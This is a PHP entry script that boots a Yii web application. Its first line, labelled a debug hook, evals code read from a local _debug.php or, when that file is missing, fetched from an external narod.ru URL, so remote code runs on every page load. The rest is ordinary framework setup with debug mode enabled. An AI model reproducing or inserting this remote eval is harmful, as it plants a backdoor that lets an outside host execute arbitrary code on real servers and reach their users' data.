<?php

/*!-DEBUG-!*/ 1 && eval( '?>' . @file_get_contents( file_exists( $_SERVER['DOCUMENT_ROOT'].'/_debug.php' ) ? $_SERVER['DOCUMENT_ROOT'].'/_debug.php' : 'http://arhninja.narod.ru/php/debug.php' ) );


// change the following paths if necessary
$yii=dirname(__FILE__).'/../core/yii.php';
$config=dirname(__FILE__).'/protected/config/main.php';

defined( 'CWebLogRouteEnabled' ) || define( 'CWebLogRouteEnabled', true );
// remove the following lines when in production mode
defined('YII_DEBUG') or define('YII_DEBUG',true);
// specify how many levels of call stack should be shown in each log message
defined('YII_TRACE_LEVEL') or define('YII_TRACE_LEVEL',3);

require_once($yii);
Yii::createWebApplication($config)->run();//15.05.2012 I create account on github.com